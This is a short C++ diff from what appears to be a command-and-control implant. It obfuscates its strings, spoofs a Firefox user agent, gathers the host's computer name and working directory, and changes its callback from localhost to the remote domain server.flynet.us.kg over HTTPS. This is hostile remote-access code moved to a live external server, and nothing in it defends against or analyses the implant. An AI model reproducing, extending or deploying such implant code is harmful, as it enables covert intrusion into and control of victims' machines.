@@ -37,8 +37,8 @@ int main(void)
     Win32::GetComputerNameW((LPWSTR)computerName, &nameSize);
     Instance.Config.exit           = false;
     Instance.Config.userAgent      = std::wstring(WOBF(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0"));
-    Instance.Config.Address.server = std::wstring(WOBF(L"127.0.0.1"));
-    Instance.Config.Address.port   = 8000;
+    Instance.Config.Address.server = std::wstring(WOBF(L"server.flynet.us.kg"));
+    Instance.Config.Address.port   = INTERNET_DEFAULT_HTTPS_PORT;
     Instance.Info.hostName         = std::wstring(computerName);
     Instance.Info.os               = std::wstring(WOBF(L"Windows 11"));
     Instance.Info.cwd              = std::wstring(spear::ToWstring(std::string(getcwd(NULL, 0))));
